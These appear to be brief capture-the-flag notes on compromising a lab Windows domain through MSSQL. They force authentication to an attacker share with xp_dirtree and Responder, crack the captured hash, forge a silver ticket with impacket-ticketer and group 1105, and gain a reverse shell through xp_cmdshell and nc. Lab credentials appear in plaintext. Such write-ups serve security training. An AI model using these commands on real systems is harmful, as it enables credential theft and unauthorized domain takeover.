GIVEN
MSSQL service: scott / Sm230#C5NatH

<img width="1251" height="94" alt="image" src="https://github.com/user-attachments/assets/5f5cc2ac-f8d8-4b72-9e70-862d74342a28" />
sudo responder -I tun0 -wv 
xp_dirtree \\10.10.17.6\share  
<img width="1853" height="126" alt="image" src="https://github.com/user-attachments/assets/7b35295c-9f90-4504-b4e9-8900a8712175" />  
cracked john  mssqlsvc : purPLE9795!@
<img width="873" height="189" alt="image" src="https://github.com/user-attachments/assets/d1dd9022-d914-4448-88a1-5f204f3269f6" />

<img width="1912" height="293" alt="image" src="https://github.com/user-attachments/assets/e8c2156c-ee58-4dd1-b95a-fb43644ae52a" />

SELECT SUSER_SID('SIGNED\Domain Users');
python3 ~/tools/suserToSid.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000
REMOVE THE 3 DIGITS AT THE BACK  
<img width="1676" height="537" alt="image" src="https://github.com/user-attachments/assets/78eb75c7-586f-4795-824e-2d8220d232e5" />

enum_logins showed signed\IT  
administrator doesnt have the rights. change to IT  

SQL (SIGNED\Administrator  guest@master)> select SUSER_SID('SIGNED\IT')
                                                           
--------------------------------------------------------   
0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000   

S-1-5-21-4088429403-1159899800-2753317549-1105

1105 is the group number

-groups 1105 flag important
impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 IT

setup xp_cmd shell and download nc and run rev shell  
<img width="1099" height="413" alt="image" src="https://github.com/user-attachments/assets/7fd5f538-aeec-4764-9e47-2d6d0e208628" />  



